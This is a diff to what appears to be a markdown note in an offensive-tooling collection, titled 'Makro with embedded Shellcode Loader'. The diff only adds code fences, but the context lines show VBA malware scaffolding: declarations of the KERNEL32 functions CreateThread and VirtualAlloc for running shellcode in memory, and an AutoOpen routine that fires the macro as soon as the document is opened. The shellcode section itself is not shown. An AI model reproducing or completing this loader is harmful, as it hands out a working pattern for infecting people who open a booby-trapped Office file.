@@ -2,7 +2,7 @@ Makro with embedded Shellcode Loader
 
 
 
-
+```
 Private Declare PtrSafe Function CreateThread Lib "KERNEL32" (ByVal SecurityAttributes As Long, ByVal StackSize As Long, ByVal StartFunction As LongPtr, ThreadParameter As LongPtr, ByVal CreateFlags As Long, ByRef ThreadId As Long) As LongPtr
 
 Private Declare PtrSafe Function VirtualAlloc Lib "KERNEL32" (ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
@@ -52,4 +52,4 @@ End Sub
 Sub AutoOpen()
     MyMacro
 End Sub
-
+```
